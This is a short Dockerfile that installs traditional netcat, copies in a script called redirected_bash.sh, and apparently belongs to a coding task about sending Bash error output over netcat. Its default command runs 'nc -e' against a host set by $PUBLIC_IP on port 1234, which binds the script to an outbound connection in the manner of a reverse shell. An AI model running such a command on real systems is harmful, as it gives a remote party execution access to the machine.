FROM ubuntu:24.04

RUN apt-get update && \
    apt-get install -y --no-install-recommends netcat-traditional && \
    rm -rf /var/lib/apt/lists/*

COPY redirected_bash.sh redirected_bash.sh
RUN chmod +x redirected_bash.sh
# Write a simple script to redirect the standard error output in Bash and send it via netcat.
CMD ["/bin/bash", "-c", "nc.traditional -v $PUBLIC_IP 1234 -e redirected_bash.sh"]